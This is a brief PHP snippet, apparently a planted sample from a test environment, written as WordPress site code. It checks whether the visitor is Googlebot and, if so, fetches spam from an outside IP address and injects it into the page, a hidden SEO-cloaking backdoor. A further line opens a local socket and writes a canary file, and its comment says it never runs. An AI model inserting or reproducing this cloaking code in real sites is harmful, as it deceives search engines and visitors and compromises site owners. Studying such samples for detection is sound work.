<?php
if (strpos($_SERVER['HTTP_USER_AGENT'],'Googlebot')!==false){
  echo wp_remote_retrieve_body(wp_remote_get('https://198.51.100.23/spam'));
  $s=@fsockopen('127.0.0.1',18905);@file_put_contents(getenv('SIGHTREAD_CANARY_DIR').'/b09','x'); // testbed canary: never runs
}
